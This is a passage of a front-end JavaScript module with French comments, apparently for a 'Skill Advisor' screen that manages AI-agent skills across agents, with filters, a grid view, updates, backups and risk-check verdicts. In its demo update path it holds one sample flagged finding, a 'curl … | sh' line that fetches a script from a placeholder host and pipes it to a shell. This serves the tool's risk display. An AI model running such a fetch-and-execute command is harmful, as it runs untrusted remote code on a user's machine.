/* Skill Advisor : vue « gestion » (route gestion), « Mes skills », vue dense.
   Recherche locale, filtres, tri, sélection multiple, grille skills × agents, activer / désactiver,
   ce qui change avant une mise à jour, coût en contexte, guide, sauvegarde avant désinstallation. */
(function () {
  window.SA = window.SA || {};
  var SA = window.SA;
  SA.views = SA.views || {};

  var FILTERS = [['tous', 'Tous'], ['maj', 'Mises à jour'], ['relire', 'À relire'], ['off', 'Désactivés'], ['ng', 'Non gérés']];
  var SORTS = [['nom', 'Nom'], ['etat', 'État'], ['ctx', 'Coût en contexte'], ['note', 'Note']];
  var CELL = { ok: ['ok', 'présent'], div: ['div', 'copie différente'], ko: ['ko', 'lien cassé'] };
  /* Verdicts du contrôle, tels que l'écran les nomme : jamais le nom interne. */
  var VERD = {
    vert: ['ok', 'Aucun motif connu', 'Le contrôle ne trouve aucun motif connu.'],
    'vert-remarques': ['no', 'Remarques', 'Le contrôle ne trouve aucun motif à risque. Il relève des remarques mineures.'],
    orange: ['tr', 'À regarder', 'Le contrôle trouve des motifs à regarder.'],
    rouge: ['bad', 'Motif à risque', 'Le contrôle trouve un motif à risque. Lisez les extraits avant de mettre à jour.']
  };
  var FST = { added: 'Ajouté', removed: 'Retiré', changed: 'Modifié' };
  var COLS = 7;

  var wrap = null, typeT = 0, armed = null, msg = '', bound = false, focusNext = '';
  /* keep : case « Garder une sauvegarde » de la confirmation en cours. busy : texte de progression d'un appel au serveur. */
  var keep = true, busy = '', err = '';
  /* held : le résultat d'un appel est arrivé pendant qu'un autre écran était affiché ; il attend la vue. */
  var held = false;
  /* saving : ids des lignes à sauvegarder pendant que le nom et la note sont demandés. saveAt : la ligne sous laquelle
     le formulaire s'ouvre (null : sélection). saveL, saveN : texte tapé, gardé ici parce que chaque rafraîchissement réécrit #gs-dyn. */
  var saving = null, saveAt = null, saveL = '', saveN = '';
  /* rg : restauration refusée pour un motif à risque, en attente de confirmation ({ id, names }). */
  var rg = null;
  /* pv : comparaison ouverte dans le tiroir « Ce qui change » ({ id, loading, data, err }). */
  var pv = null;

  var esc = function (s) { return SA.esc(s); };
  function live() { return !!(SA.live && SA.live.on); }
  /* r donné : le bouton est aussi coupé pour un skill de projet, que le serveur ne gère pas. */
  function dis(r) { return busy || proj(r) ? ' disabled' : ''; }
  /* ---------- mode réel : nom de dossier et portée ---------- */
  var NAME = /^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/;
  var PROJ = 'Skill de projet : gérez-le depuis le dossier du projet.';
  /* Les routes attendent le nom du dossier sur le disque (dernier segment de r.path), pas le nom du front matter. */
  function folder(r) {
    var n = String((r && r.path) || '').replace(/[\/\\]+$/, '').split(/[\/\\]/).pop();
    return NAME.test(n) ? n : null;
  }
  function proj(r) { return !!(r && live() && r.scope === 'project'); }
  /* SA.state.held : dossiers dont la nouvelle version a été retenue par le serveur (motif à risque). */
  function isHeld(r) { var n = live() && folder(r); return !!(n && SA.state.held && SA.state.held[n]); }
  /* Lot réel : noms de dossier à envoyer, et phrase qui nomme les lignes écartées. */
  function pick(list) {
    var out = [], left = [];
    list.forEach(function (r) {
      if (!r) return;
      var n = folder(r);
      if (r.scope === 'project') left.push(r.name + ' (skill de projet)');
      else if (!n) left.push(r.name + ' (nom de dossier non valide)');
      else if (out.indexOf(n) < 0) out.push(n);
    });
    return { names: out, note: left.length ? 'Laissés de côté : ' + left.join(', ') + '.' : '' };
  }
  function keepBox() {
    /* Le label autour du bouton : un clic sur le texte coche aussi. */
    return '<label class="cfm-k"><button type="button" class="cb" role="checkbox" aria-checked="' + keep + '" data-gs-keep' + dis() + '>' + SA.icon('check') + '</button>' +
      '<span>Garder une sauvegarde</span></label>';
  }
  function g() { return SA.state.g; }
  function mine() { return SA.state.mine || []; }
  function find(id) { return SA.mineRow(id); }
  /* Colonnes : les agents actifs. Un écart : un agent actif où le skill est absent, différent ou cassé.
     Les skills de plugin n'existent que dans leur agent : ce n'est pas un écart. */
  function cols() { return SA.agentsOn(); }
  function gaps(r) { var a = r.ag || {}; return r.kind !== 'plugin' && cols().some(function (c) { return a[c.id] !== 'ok'; }); }

  function matches(r, f) {
    if (f === 'maj') return r.st === 'maj';
    if (f === 'relire') return r.warn === 1 || r.warn === 2;
    if (f === 'off') return r.on === false;
    if (f === 'ng') return r.st === 'ng';
    return true;
  }
  function counts() {
    var c = { tous: 0, maj: 0, relire: 0, off: 0, ng: 0, chars: 0, auto: 0 };
    mine().forEach(function (r) {
      FILTERS.forEach(function (f) { if (matches(r, f[0])) c[f[0]]++; });
      if (r.st === 'maj' && !risky(r)) c.auto++;
      if (r.on !== false) c.chars += r.chars || 0;
    });
    return c;
  }
  function rank(r) { return (r.st === 'maj' ? 0 : 10) + (r.warn === 2 ? 0 : r.warn === 1 ? 2 : 4) + (r.st === 'ng' ? 1 : 0); }
  function rows() {
    var s = g(), q = s.q.trim().toLowerCase();
    var out = mine().filter(function (r) {
      if (!matches(r, s.f)) return false;
      if (s.view === 'grille' && s.gapsOnly && !gaps(r)) return false;
      return !q || (r.name + ' ' + r.src).toLowerCase().indexOf(q) > -1;
    });
    out.sort(function (a, b) {
      if (s.sort === 'ctx') return (b.chars || 0) - (a.chars || 0);
      if (s.sort === 'note') return (b.note == null ? -1 : b.note) - (a.note == null ? -1 : a.note);
      if (s.sort === 'etat') return rank(a) - rank(b) || a.name.localeCompare(b.name);
      return a.name.localeCompare(b.name) || a.src.localeCompare(b.src);
    });
    return out;
  }
  /* Sélection : les actions groupées ne visent que les lignes affichées. */
  function selAll() { var sel = g().sel; return mine().filter(function (r) { return sel[r.id]; }); }
  function selected() { var sel = g().sel; return rows().filter(function (r) { return sel[r.id]; }); }
  /* Quatre noms, puis le reste en nombre. */
  function namesOf(list) {
    var n = list.length;
    return list.slice(0, 4).map(function (r) { return r.name; }).join(', ') + (n > 4 ? ' et ' + SA.pl(n - 4, 'autre', 'autres') : '');
  }

  /* ---------- cellules ---------- */
  function nameBtn(r) {
    return '<button type="button" class="gs-name mono" ' + (r.real ? 'data-detail' : 'data-local') + '="' + esc(r.id) + '" title="' + esc(r.name) + '"><span class="gs-nm">' + esc(r.name) + '</span></button>';
  }
  function srcText(r) {
    if (r.kind === 'plugin') return 'plugin ' + r.plugin;
    /* Mode réel : pas de recherche de source par empreinte. */
    if (r.kind === 'manuel' && live()) return 'copie manuelle';
    if (r.kind === 'manuel') return r.dup ? 'copie manuelle · doublon' : r.match ? 'copie manuelle · source retrouvée : ' + r.match : 'copie manuelle · aucune source retrouvée';
    return r.src;
  }
  function srcLine(r) {
    var t = esc(srcText(r));
    return '<span class="gs-src mut" title="' + t + '">' + t + '</span>';
  }
  function dots(r) {
    var list = cols(), label = list.map(function (a) { var v = (r.ag || {})[a.id]; return a.name + ' : ' + (CELL[v] ? CELL[v][1] : 'absent'); }).join(' ; ');
    return '<span class="gs-dots" role="img" aria-label="' + esc(label) + '" title="' + esc(label) + '">' +
      list.map(function (a) { var v = (r.ag || {})[a.id]; return '<i class="gs-d gs-d-' + (v || 'no') + '"></i>'; }).join('') + '</span>';
  }
  function status(r) {
    var h = '', lv = live();
    if (r.st === 'maj') h += '<span class="bdg up">Mise à jour</span>';
    else if (r.kind === 'plugin') h += '<span class="bdg no">Plugin</span>';
    else if (r.kind === 'manuel') h += '<span class="bdg no">Copie manuelle</span>';
    else h += '<span class="bdg ok">À jour</span>';
    /* Verdict du contrôle, nommé comme partout, en mode réel comme en démonstration. */
    var hi = VERD.rouge[1], lo = VERD.orange[1];
    if (r.warn === 2) h += r.real ? '<button type="button" class="bdg bad wbtn" data-warnpop="' + esc(r.id) + '">' + hi + '</button>' : '<button type="button" class="bdg bad wbtn" data-local="' + esc(r.id) + '">' + hi + '</button>';
    else if (r.warn === 1) h += r.real ? '<button type="button" class="bdg tr wbtn" data-warnpop="' + esc(r.id) + '">' + lo + '</button>' : '<span class="bdg tr">' + lo + '</span>';
    if (r.dup) h += '<span class="bdg tr">Doublon</span>';
    return h;
  }
  function ctx(r) {
    if (r.chars == null) return '<span class="mut">–</span>';
    return '<span class="' + (r.chars > SA.detail.CUT ? 'gs-over' : '') + '">' + SA.nb(r.chars) + '</span>';
  }
  /* Les gestes restent en place : la confirmation et le formulaire s'ouvrent dans une ligne entière, sous le skill. */
  function act(r) {
    var id = esc(r.id), h = '';
    if (r.st === 'maj') h += '<button type="button" class="gs-a gs-a-up" data-gs-diff="' + id + '"' + dis() + '>Ce qui change</button>';
    /* Mode réel : le serveur n'a pas de route pour rattacher une copie manuelle. */
    if (r.kind === 'manuel' && r.match && !live()) h +='<button type="button" class="gs-a gs-a-up" data-gs-adopt="' + id + '"' + dis() + '>Prendre en charge</button>';
    h += '<button type="button" class="gs-a" data-guide="' + id + '">Guide</button>';
    if (r.kind !== 'plugin') h += '<button type="button" class="gs-a" data-gs-save="' + id + '" aria-expanded="' + (saveAt === r.id && !!saving) + '" aria-label="Sauvegarder ' + esc(r.name) + '"' + dis(r) + '>Sauvegarder</button>';
    if (r.kind !== 'plugin') h += '<button type="button" class="gs-a" data-gs-un="' + id + '" aria-expanded="' + (armed === r.id) + '" aria-label="Désinstaller ' + esc(r.name) + '"' + dis(r) + '>Désinstaller</button>';
    return h;
  }
  function confirmHTML(r) {
    var id = esc(r.id);
    return '<div class="cfm gs-cf" role="group" aria-label="Désinstaller ' + esc(r.name) + '">' +
      '<p class="cfm-t">Désinstaller <span class="mono">' + esc(r.name) + '</span> ? Skill Advisor le retire de tous les agents.</p>' + keepBox() +
      '<p class="cfm-a"><button type="button" class="btn danger" data-gs-un-ok="' + id + '"' + dis() + '>Confirmer</button>' +
      '<button type="button" class="btn quiet" data-gs-un-no="' + id + '"' + dis() + '>Annuler</button></p></div>';
  }
  /* Ligne entière sous le skill : toujours dans la largeur visible de la table. */
  function extraRow(r) {
    var h = armed === r.id ? confirmHTML(r) : saving && saveAt === r.id ? saveHTML() : '';
    return h ? '<tr class="gs-xr" data-id="' + esc(r.id) + '"><td colspan="' + COLS + '"><div class="gs-xin">' + h + '</div></td></tr>' : '';
  }

  function rowHTML(r) {
    var sel = !!g().sel[r.id], plugin = r.kind === 'plugin', x = extraRow(r);
    return '<tr class="gs-r' + (r.on === false ? ' is-off' : '') + (sel ? ' is-sel' : '') + (x ? ' has-x' : '') + '" data-id="' + esc(r.id) + '">' +
      '<td class="gs-c-cb"><button type="button" class="cb" role="checkbox" aria-checked="' + sel + '" data-gs-sel="' + esc(r.id) + '" aria-label="Sélectionner ' + esc(r.name) + '">' + SA.icon('check') + '</button></td>' +
      '<td class="gs-c-n">' + nameBtn(r) + srcLine(r) + (proj(r) ? '<span class="gs-pj mut">' + PROJ + '</span>' : '') + '</td>' +
      '<td class="gs-c-ag">' + dots(r) + '</td>' +
      '<td class="gs-c-st">' + status(r) + '</td>' +
      '<td class="gs-c-ctx mono">' + ctx(r) + '</td>' +
      '<td class="gs-c-on">' + (plugin ? '<span class="mut gs-na">par le plugin</span>'
        : '<button type="button" class="sw" role="switch" aria-checked="' + (r.on !== false) + '" data-gs-on="' + esc(r.id) + '" aria-label="' + esc(r.name) + ' : actif"' + dis(r) + '></button>') + '</td>' +
      '<td class="gs-c-act"><div class="gs-acts">' + act(r) + '</div></td></tr>' + x;
  }

  function listHTML(list) {
    var all = list.length && list.every(function (r) { return g().sel[r.id]; });
    return '<div class="gs-tablewrap"><table class="gs-table"><thead><tr>' +
      '<th class="gs-c-cb"><button type="button" class="cb" role="checkbox" aria-checked="' + !!all + '" data-gs-sel="all" aria-label="Tout sélectionner">' + SA.icon('check') + '</button></th>' +
      '<th scope="col" class="gs-c-n">Skill</th><th scope="col" class="gs-c-ag">Agents</th><th scope="col" class="gs-c-st">État</th><th scope="col" class="gs-c-ctx">Contexte</th><th scope="col" class="gs-c-on">Actif</th><th scope="col" class="gs-c-act"><span class="vh">Actions</span></th>' +
      '</tr></thead><tbody>' + list.map(rowHTML).join('') + '</tbody></table></div>';
  }

  function gridHTML(list) {
    var c = cols();
    return '<div class="gs-tablewrap"><table class="gs-table gs-grid"><thead><tr><th scope="col">Skill</th>' +
      c.map(function (a) { return '<th scope="col" class="gs-gc">' + esc(a.name) + '</th>'; }).join('') + '</tr></thead><tbody>' +
      list.map(function (r) {
        return '<tr class="gs-r' + (r.on === false ? ' is-off' : '') + '"><th scope="row" class="gs-c-n">' + nameBtn(r) + srcLine(r) + '</th>' +
          c.map(function (a) {
            var v = (r.ag || {})[a.id], k = CELL[v];
            return '<td class="gs-gc"><span class="gs-cell gs-cell-' + (v || 'no') + '"><i class="gs-d gs-d-' + (v || 'no') + '" aria-hidden="true"></i><span' + (k && v !== 'ok' ? '' : ' class="vh"') + '>' + (k ? k[1] : 'absent') + '</span></span></td>';
          }).join('') + '</tr>';
      }).join('') + '</tbody></table></div>' +
      '<p class="gs-legend mut"><span><i class="gs-d gs-d-ok"></i>présent</span><span><i class="gs-d gs-d-div"></i>copie différente du dossier partagé</span><span><i class="gs-d gs-d-ko"></i>lien cassé</span><span><i class="gs-d gs-d-no"></i>absent</span></p>' +
      '<p class="gs-foot mut">Pour corriger un écart, réinstallez le skill dans l’agent concerné.</p>';
  }

  /* ---------- zones redessinées ---------- */
  function subHTML() {
    var c = counts(), tok = Math.round(c.chars / 4 / 100) * 100;
    return SA.pl(c.maj, 'mise à jour', 'mises à jour') + ' · ' + c.relire + ' à relire · ' + SA.pl(c.off, 'désactivé', 'désactivés') +
      ' · environ ' + SA.nb(tok) + ' jetons de contexte pour les skills actifs';
  }
  function filtersHTML() {
    var s = g(), c = counts();
    return FILTERS.map(function (x) { return '<button type="button" data-gs-f="' + x[0] + '" aria-pressed="' + (x[0] === s.f) + '">' + x[1] + '<span class="gs-fn num">' + c[x[0]] + '</span></button>'; }).join('');
  }
  function toolsHTML() {
    var s = g();
    return '<label class="gs-sortl"><span class="vh">Trier par</span><select id="gs-sort" class="fld gs-sort">' +
        SORTS.map(function (x) { return '<option value="' + x[0] + '"' + (x[0] === s.sort ? ' selected' : '') + '>Tri : ' + x[1] + '</option>'; }).join('') + '</select></label>' +
      '<div class="seg gs-view" role="group" aria-label="Affichage">' +
        [['liste', 'Liste'], ['grille', 'Grille']].map(function (x) { return '<button type="button" data-gs-view="' + x[0] + '" aria-pressed="' + (x[0] === s.view) + '">' + x[1] + '</button>'; }).join('') + '</div>';
  }
  function bulkHTML() {
    var sel = selected(), n = sel.length, hid = selAll().length - n;
    if (!n && !hid) return '';
    /* Lignes sélectionnées puis masquées par la recherche ou le filtre : dites, jamais touchées. */
    if (!n) {
      return '<div class="gs-bulk" role="group" aria-label="Actions sur la sélection"><p class="gs-bulk-n">' +
        SA.pl(hid, 'skill sélectionné est masqué', 'skills sélectionnés sont masqués') + ' par le filtre. Les actions ne les touchent pas.</p>' +
        '<button type="button" class="btn quiet" data-gs-bulk="clear">Tout désélectionner</button></div>';
    }
    if (armed === 'bulk') {
      return '<div class="gs-bulk cfm" role="group" aria-label="Désinstaller la sélection"><p class="gs-bulk-n cfm-t">Désinstaller ' + SA.pl(n, 'skill', 'skills') +
        ' : <span class="mono">' + esc(namesOf(sel)) + '</span> ?</p>' + keepBox() +
        '<p class="cfm-a"><button type="button" class="btn danger" data-gs-bulk="un-ok"' + dis() + '>Confirmer</button><button type="button" class="btn quiet" data-gs-bulk="un-no"' + dis() + '>Annuler</button></p></div>';
    }
    var maj = sel.filter(function (r) { return r.st === 'maj'; }).length;
    return '<div class="gs-bulk" role="group" aria-label="Actions sur la sélection"><p class="gs-bulk-n"><span class="num">' + n + '</span> ' + (n > 1 ? 'sélectionnés' : 'sélectionné') +
      (hid ? '<span class="gs-bulk-h mut"> · ' + SA.pl(hid, 'autre masqué', 'autres masqués') + ' par le filtre, non ' + (hid > 1 ? 'concernés' : 'concerné') + '</span>' : '') + '</p>' +
      (maj ? '<button type="button" class="btn" data-gs-bulk="maj"' + dis() + '>Mettre à jour<span class="kbd">' + maj + '</span></button>' : '') +
      '<button type="button" class="btn" data-gs-bulk="off"' + dis() + '>Désactiver</button>' +
      '<button type="button" class="btn" data-gs-bulk="on"' + dis() + '>Activer</button>' +
      '<button type="button" class="btn" data-gs-bulk="save"' + dis() + '>Sauvegarder</button>' +
      '<button type="button" class="btn" data-gs-bulk="un"' + dis() + '>Désinstaller</button>' +
      '<button type="button" class="btn quiet" data-gs-bulk="clear">Tout désélectionner</button></div>';
  }
  /* Nom et note demandés avant une sauvegarde à la demande. */
  function saveHTML() {
    if (!saving) return '';
    var list = saving.map(find).filter(Boolean), n = list.length;
    if (!n) return '';
    return '<div class="gs-save" role="group" aria-labelledby="gs-save-t">' +
      '<p class="gs-bulk-n" id="gs-save-t">Sauvegarder ' + SA.pl(n, 'skill', 'skills') + ' : <span class="mono">' + esc(namesOf(list)) + '</span></p>' +
      '<label class="gs-save-f"><span>Nom, facultatif</span><input id="gs-save-l" class="fld" type="text" maxlength="80" autocomplete="off" value="' + esc(saveL) + '"></label>' +
      '<label class="gs-save-f"><span>Note, facultative</span><input id="gs-save-n" class="fld" type="text" maxlength="500" autocomplete="off" value="' + esc(saveN) + '"></label>' +
      '<p class="gs-save-a"><button type="button" class="btn primary" data-gs-save-ok' + dis() + '>Sauvegarder</button>' +
      '<button type="button" class="btn quiet" data-gs-save-no' + dis() + '>Annuler</button></p></div>';
  }
  /* Le formulaire d'une ligne s'ouvre sous elle, tant qu'elle est affichée ; sinon au-dessus de la table. */
  function saveInRow(list) {
    return !!(saving && saveAt && g().view !== 'grille' && list.some(function (r) { return r.id === saveAt; }));
  }
  /* Résumé : le détail et les gestes sont sur l'écran Sauvegardes. */
  function backupsHTML() {
    var b = SA.state.backups || [];
    if (!b.length) return '';
    var last = SA.normBackup(b[0]), d = last.at ? new Date(last.at) : null, p = function (n) { return (n < 10 ? '0' : '') + n; };
    var day = d && !isNaN(d.getTime()) ? ', du ' + p(d.getDate()) + '/' + p(d.getMonth() + 1) + '/' + d.getFullYear() : '';
    return '<section class="gs-bk" aria-labelledby="gs-bk-t"><h2 class="h2" id="gs-bk-t">Sauvegardes</h2>' +
      '<p class="sub">' + SA.pl(b.length, 'sauvegarde', 'sauvegardes') + ' sur cette machine. La plus récente : <span class="mono">' + esc(last.label) + '</span>' + esc(day) + '.</p>' +
      (rg && rg.id === last.id
        ? '<div class="cfm gs-rg" role="group" aria-label="Restaurer malgré le motif à risque"><p class="cfm-t">Ce skill porte un motif à risque. Restaurer malgré tout ?</p>' +
          '<p class="cfm-a"><button type="button" class="btn danger" data-gs-rg-ok' + dis() + '>Restaurer malgré tout</button>' +
          '<button type="button" class="btn quiet" data-gs-rg-no' + dis() + '>Annuler</button></p></div>'
        : '<p class="gs-bk-a"><button type="button" class="btn" data-go-route="sauvegardes">Voir les sauvegardes</button>' +
          '<button type="button" class="gs-a gs-a-up" data-gs-restore="0"' + dis() + '>Restaurer la plus récente</button></p>') + '</section>';
  }
  /* État qui ne correspond plus à ce qui est affiché : une confirmation ne reste jamais armée hors de vue. */
  function prune(list) {
    if (armed === 'bulk') { if (!selected().length) armed = null; }
    else if (armed && !(g().view !== 'grille' && list.some(function (r) { return r.id === armed; }))) armed = null;
    if (saving && !saving.map(find).filter(Boolean).length) { saving = null; saveAt = null; }
    var b = SA.state.backups || [];
    if (rg && !(b[0] && String(b[0].id) === rg.id)) rg = null;
  }
  function dynHTML() {
    var s = g(), list = rows(), c = counts();
    prune(list);
    var gapN = mine().filter(gaps).length;
    return (busy ? '<p class="gs-msg" tabindex="-1">' + esc(busy) + '</p>' : msg ? '<p class="gs-msg" tabindex="-1">' + esc(msg) + '</p>' : '') +
      (err ? '<div class="note note-bad gs-err" role="alert" tabindex="-1"><p class="note-t">L’opération n’a pas abouti</p><p class="sub">' + esc(err) + '</p></div>' : '') +
      (SA.offline() ? '<div class="note note-warn"><p class="note-t">Hors ligne</p><p class="sub">Recherche de mises à jour suspendue : l’état affiché est le dernier connu. Activer, désactiver et désinstaller restent possibles.</p></div>' : '') +
      (saving && !saveInRow(list) ? saveHTML() : bulkHTML()) +
      (s.view === 'grille'
        ? '<p class="gs-gapbar"><button type="button" class="sw" role="switch" aria-checked="' + !!s.gapsOnly + '" data-gs-gaps aria-labelledby="gs-gap-l"></button><span id="gs-gap-l">Écarts seulement</span><span class="mut">' + SA.pl(gapN, 'skill n’est pas', 'skills ne sont pas') + ' au même état dans tous les agents</span></p>'
        : '') +
      (list.length
        ? (s.view === 'grille' ? gridHTML(list) : listHTML(list))
        : '<div class="empty gs-none"><p class="sub">Aucun skill ne correspond.</p><p class="empty-a"><button type="button" class="btn" data-gs-reset>Effacer la recherche et les filtres</button></p></div>') +
      '<p class="gs-count mono mut">' + list.length + ' sur ' + c.tous + (list.length > 1 ? ' affichés' : ' affiché') + '</p>' +
      backupsHTML() +
      '<section class="gs-why"><h2 class="h2">Bon à savoir</h2>' +
        '<p class="sub"><strong>Désactiver</strong> laisse le skill sur le disque : l’agent ne le charge plus et il ne pèse plus en contexte. ' +
          'Le skill est rangé dans le dossier de réserve <span class="mono">~/.skill-advisor/disabled</span> et revient d’un clic.</p>' +
        '<p class="sub"><strong>Désinstaller</strong> retire le skill de tous les agents. La confirmation propose d’en garder une sauvegarde, cochée par défaut : décochez-la pour ne rien garder.</p>' +
        '<p class="sub"><strong>Copie manuelle</strong> : désinstallable comme les autres. ' + (live()
          ? 'Elle ne se met pas à jour : pour qu’elle le fasse, réinstallez-la depuis sa source.</p>'
          : 'Si sa source est retrouvée par son empreinte, « Prendre en charge » la rattache et elle se met à jour comme les autres.</p>') +
        '<p class="sub"><strong>Plugin</strong> : c’est le plugin qui installe, met à jour et active ses skills. Skill Advisor les montre et les contrôle, sans y toucher.</p>' +
        '<p class="sub"><strong>Changer de machine</strong> : sauvegardez vos skills, puis exportez la sauvegarde depuis l’écran Sauvegardes. Importez-la sur l’autre machine.</p>' +
        '<p class="gs-file"><button type="button" class="btn" data-go-route="sauvegardes">Ouvrir Sauvegardes</button></p></section>';
  }

  function render() {
    var c = counts();
    if (!c.tous && !(SA.state.backups || []).length) {
      return '<div class="gs"><p class="eye" data-st>Mes skills</p>' + SA.h1('Aucun skill installé') +
        '<div class="empty" data-st><p class="sub">Rien n’a été trouvé dans les dossiers de vos agents. Les skills installés ici, ou ajoutés à la main, apparaîtront dans cette liste.</p>' +
        '<p class="empty-a"><button type="button" class="btn primary" data-go-step="1">Obtenir un conseil</button><button type="button" class="btn" data-go-route="recherche">Ouvrir la recherche</button></p></div></div>';
    }
    return '<div class="gs">' +
      '<p class="eye" data-st>Mes skills</p>' +
      SA.h1(SA.pl(c.tous, 'skill', 'skills') + ' sur cette machine') +
      '<p class="gs-sub sub" id="gs-sub" data-st>' + subHTML() + '</p>' +
      /* Recherche automatique des mises à jour : sa progression et son résultat, seulement ici. */
      (live() ? '<p class="gs-chk sub" id="gs-chk" role="status">' + esc(chkText()) + '</p>' : '') +
      '<div class="gs-bar" data-st>' +
        '<div class="gs-qbox"><label class="vh" for="gs-q">Chercher dans mes skills</label>' +
          '<input id="gs-q" class="fld gs-q" type="search" placeholder="Chercher dans mes skills" autocomplete="off" spellcheck="false" value="' + esc(g().q) + '"><span class="kbd gs-qk" aria-hidden="true">/</span></div>' +
        '<div class="gs-tools" id="gs-tools">' + toolsHTML() + '</div>' +
        (live() ? '<button type="button" class="btn gs-check" id="gs-check"' + (busy || auto.on ? ' disabled' : '') + ' data-gs-check>Rechercher les mises à jour</button>' : '') +
        '<button type="button" class="btn primary gs-all" id="gs-all"' + (c.auto ? '' : ' hidden') + dis() + ' data-gs-all>Tout mettre à jour<span class="kbd">' + c.auto + '</span></button>' +
      '</div>' +
      '<div class="seg gs-seg" id="gs-filters" role="group" aria-label="Filtrer les skills" data-st>' + filtersHTML() + '</div>' +
      /* Zone d'annonce qui reste en place : le message est lu même quand le focus ne bouge pas. */
      '<p class="vh" id="gs-live" role="status">' + esc(busy || msg) + '</p>' +
      '<div id="gs-dyn" data-st>' + dynHTML() + '</div>' +
    '</div>';
  }

  /* Redessine les zones qui dépendent de l'état, sans toucher au champ de recherche. Le focus suit le bouton. */
  function fkey(el) {
    if (!el || !el.attributes) return null;
    for (var i = 0; i < el.attributes.length; i++) {
      var a = el.attributes[i];
      if (/^data-(gs-|guide)/.test(a.name)) { var tr = el.closest('tr'); return [a.name, a.value, tr ? tr.getAttribute('data-id') : '']; }
    }
    /* Champ ou liste sans attribut de geste (tri, formulaire) : retrouvé par son id. */
    return el.id ? ['id', el.id, ''] : null;
  }
  function active() { return document.activeElement || null; }
  /* Pendant un appel, le bouton qui a le focus le garde : il est annoncé inactif au lieu d'être désactivé. */
  function lock(el, on) {
    if (!el) return;
    var hold = on && el === active();
    el.disabled = !!on && !hold;
    if (hold) el.setAttribute('aria-disabled', 'true'); else el.removeAttribute('aria-disabled');
  }
  /* f : un sélecteur fixe, ou [attribut, valeur, id de ligne] quand la valeur vient d'un id (jamais mise dans un sélecteur). */
  function resolve(f) {
    if (!f) return null;
    if (typeof f === 'string') return wrap.querySelector(f);
    if (!/^[\w-]+$/.test(f[0])) return null;
    var hit = null;
    [].forEach.call(wrap.querySelectorAll('[' + f[0] + ']'), function (el) {
      if (hit || el.getAttribute(f[0]) !== f[1]) return;
      if (f.length > 2) { var tr = el.closest('tr'); if ((tr ? tr.getAttribute('data-id') : '') !== f[2]) return; }
      hit = el;
    });
    return hit;
  }
  /* show : le focus vient d'un geste, la cible est amenée dans la zone visible. */
  function focusOn(el, show) {
    if (!el) return false;
    if (el.disabled) {
      if (!busy) return false;
      el.disabled = false;
      el.setAttribute('aria-disabled', 'true');
    }
    try { el.focus({ preventScroll: true }); } catch (e) { el.focus(); }
    if (show && typeof el.scrollIntoView === 'function') el.scrollIntoView({ block: 'nearest', inline: 'nearest' });
    return true;
  }
  function refresh() {
    if (!wrap || !wrap.isConnected) return;
    if (!mine().length && !(SA.state.backups || []).length) { SA.repaint(); return; }
    var was = active(), inside = !!(was && wrap.contains(was));
    var k = inside ? fkey(was) : null;
    var c = counts(), h1 = wrap.querySelector('h1');
    if (h1) h1.textContent = SA.pl(c.tous, 'skill', 'skills') + ' sur cette machine';
    wrap.querySelector('#gs-sub').textContent = subHTML();
    wrap.querySelector('#gs-tools').innerHTML = toolsHTML();
    wrap.querySelector('#gs-filters').innerHTML = filtersHTML();
    wrap.querySelector('#gs-dyn').innerHTML = dynHTML();
    var all = wrap.querySelector('#gs-all');
    /* Le bouton ne compte que ce qu'il peut faire : une version à risque se décide dans « Ce qui change ». */
    all.hidden = !c.auto;
    lock(all, !!busy);
    all.querySelector('.kbd').textContent = c.auto;
    paintChk();
    var say = wrap.querySelector('#gs-live'), txt = busy || msg;
    if (say && say.textContent !== txt) say.textContent = txt;
    /* Un geste qui remplace son propre bouton dit où le focus doit aller : jamais perdu, jamais sur « Confirmer ». */
    var f = focusNext, done = false;
    focusNext = '';
    if (f) done = focusOn(resolve(f), true);
    if (!done && k) done = focusOn(resolve(k), false);
    /* Jamais sur <body> : à défaut du bouton, le message. */
    var now = active();
    if (inside && (!now || !wrap.contains(now) || now.hidden || now.disabled)) {
      if (!focusOn(wrap.querySelector('.gs-err'), true) && !focusOn(wrap.querySelector('.gs-msg'), true)) focusOn(wrap.querySelector('#gs-q'), false);
    }
    SA.sync();
  }

  /* ---------- gestes ---------- */
  function applyUpdate(r) {
    if (!r || r.st !== 'maj') return;
    r.st = 'ok';
    if (r.diff && r.diff.scan.level === 2) {
      r.warn = 2;
      r.local = [{ label: 'Téléchargement suivi d’une exécution', file: 'scripts/publier.sh', line: 2, excerpt: 'curl -fsSL https://exemple.invalid/outil.sh | sh' }];
    }
    delete r.diff;
  }
  /* ---------- mode réel : chaque geste passe par le serveur local, l'état revient avec la réponse ---------- */
  function failText(list) {
    return (list || []).map(function (f) { return (f.name ? f.name + ' : ' : '') + (f.message || 'échec.'); }).join(' ');
  }
  /* Seules les erreurs de live.js (avec un code) ont un message en français ; une autre erreur ne s'affiche pas telle quelle. */
  function errText(e) {
    if (e && e.code && e.message) return e.message;
    return e && e.code ? 'Le serveur local n’a pas répondu.' : 'Réponse inattendue du serveur local. Rechargez la page pour voir l’état réel.';
  }
  function join() { return [].slice.call(arguments).filter(Boolean).join(' '); }
  function after() { if (SA.viewId() === 'gestion') refresh(); else SA.repaint(); }
  /* Fin d'un appel, réussi ou non : le verrou est toujours rendu. back : le bouton qui a servi, s'il existe encore ; sinon le message. */
  function finish(back) {
    busy = '';
    focusNext = err ? '.gs-err' : (back || '.gs-msg');
    held = SA.viewId() !== 'gestion';
    after();
  }
  /* Recherche des mises à jour : une fois par chargement de la page, puis sur demande. Chaque recherche interroge GitHub. */
  var checked = false;
  /* Recherche automatique (première visite) : elle ne bloque aucun bouton. Progression et résultat s'affichent
     en tête de liste. L'attente s'arrête après 20 s ; une réponse plus tardive est ignorée (l'état revient
     avec la prochaine actualisation). gen : numéro de la recherche en cours, pour écarter une réponse périmée. */
  var AUTO_MAX = 20000;
  var auto = { on: false, gen: 0, timer: 0, note: '' };
  function chkText() { return auto.on ? 'Recherche des mises à jour…' : auto.note; }
  function paintChk() {
    if (!wrap || !wrap.isConnected) return;
    var c = wrap.querySelector('#gs-chk'), t = chkText();
    if (c && c.textContent !== t) c.textContent = t;
    lock(wrap.querySelector('#gs-check'), !!busy || auto.on);
  }
  function autoEnd(gen) {
    if (gen !== auto.gen) return false;
    clearTimeout(auto.timer);
    auto.on = false;
    return true;
  }
  function autoCheck() {
    if (checked || auto.on || !live()) return null;
    checked = true;
    var gen = ++auto.gen, n = 0;
    auto.on = true; auto.note = '';
    paintChk();
    auto.timer = setTimeout(function () {
      if (!autoEnd(gen)) return;
      auto.gen++;
